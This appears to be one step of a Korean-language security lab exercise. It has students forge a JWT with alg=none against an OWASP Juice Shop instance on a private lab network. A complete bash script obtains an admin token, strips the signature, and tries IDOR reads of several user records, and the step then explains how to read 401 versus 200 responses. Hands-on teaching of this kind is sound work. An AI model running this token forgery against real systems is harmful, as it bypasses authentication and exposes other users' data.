  - order: 4
    instruction: |
      ## 🎯 MISSION — JWT alg=none 변조 시도 + 결과 분석

      JWT header 의 `alg` 를 `RS256` → `none` 변조 + signature 제거 + IDOR 재시도.
      대부분 modern lib (2020+) 에서 차단 — 본 step 은 *시도 + 결과 분석* 학습.

      ## 📚 사전 학습 (학생 혼돈 방지)

      - **alg=none** = JWT 표준 의 *서명 X* 모드. RFC 7519 에 명시
      - **2015 의 critical bug** = 많은 JWT lib 의 *alg=none* 자동 통과 — 토큰 변조 가능
      - **2024 의 modern lib** = `alg=none` 거부 default. 단 *legacy code* 에 여전 가능
      - **변조 절차** = (1) header 변조 (RS256 → none) (2) payload 변조 (옵션 — role
        변경 등) (3) signature 제거

      ## 💻 실행 명령

      ```bash
      ssh 6v6-attacker bash <<'SH'
      # 1) 원본 token 획득
      TOK=$(curl -s -X POST -H 'Content-Type: application/json' -H 'Host: juice.6v6.lab' \
        http://10.20.30.1/rest/user/login \
        -d '{"email":"admin@juice-sh.op","password":"admin123"}' | jq -r .authentication.token)
      PAYLOAD=$(echo $TOK | cut -d. -f2)

      # 2) 변조 header (alg: none)
      NEW_HEADER=$(echo -n '{"alg":"none","typ":"JWT"}' | base64 | tr -d '=' | tr '/+' '_-')

      # 3) 변조 token (header.payload. — signature 빈 문자)
      EVIL_TOK="${NEW_HEADER}.${PAYLOAD}."

      echo "=== Original token (head) ==="
      echo $TOK | head -c 80
      echo ""
      echo "=== Evil token (alg=none) ==="
      echo $EVIL_TOK | head -c 100
      echo ""

      # 4) Evil token 으로 IDOR 시도
      for id in 1 2 3; do
        code=$(curl -s -o /dev/null -w '%{http_code}' \
          -H 'Host: juice.6v6.lab' -H "Authorization: Bearer $EVIL_TOK" \
          http://10.20.30.1/api/Users/$id)
        echo "user $id (alg=none): $code"
      done
      SH
      ```

      ## 📋 확인 사항

      - Evil token 의 *3 segment* (header.payload.)
      - 응답 코드 (401 = 정상 차단 / 200 = vuln)
      - 차단 시 의 응답 body (`Authorization` error message)

      ## 💡 왜 이걸 하는가?

      JWT 의 *2015 critical bug* (alg=none 통과) 의 *현재 modern lib 의 대응* 확인.
      *legacy code* 의 *여전 한 위험* 인지.

      ## 🔍 결과 해석

      - **정상 (modern)**: 5 user 모두 401 + "invalid algorithm" 응답
      - **vuln (legacy)**: 5 user 모두 200 + 본인 외 user 데이터 노출
      - **403**: ModSec 또는 다른 WAF 가 차단

      ## 비정상 시 대응

      - **모두 200 (vuln)**: 즉시 보고 + JuiceShop 의 *legacy mode* 또는 *교육 의도*
        확인
      - **응답 body 분석**: `curl ... | head` 로 error message 확인
    hint: |
      alg=none 변조 + signature 제거 + IDOR retry → 401 (modern) 또는 200 (vuln).
